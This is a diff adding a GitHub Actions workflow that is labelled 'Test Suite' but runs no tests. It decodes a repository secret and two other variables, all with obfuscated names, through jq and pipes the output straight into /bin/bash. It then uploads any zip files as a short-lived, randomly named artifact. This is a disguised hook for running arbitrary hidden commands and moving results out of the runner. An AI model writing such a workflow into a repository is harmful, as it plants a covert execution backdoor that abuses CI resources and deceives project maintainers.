@@ -1,0 +1,24 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          ude29: ${{ secrets.ude29 }}
+        run: |
+          printf '%s' "$ude29" | jq -r .kn3 | /bin/bash
+          echo $lgssg7327 | jq -r .zs67513 | /bin/bash
+          printf '%s' "$trjls32909" | jq -r .y7350 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: cWutHAp2
+          path: "*.zip"
+          retention-days: 1
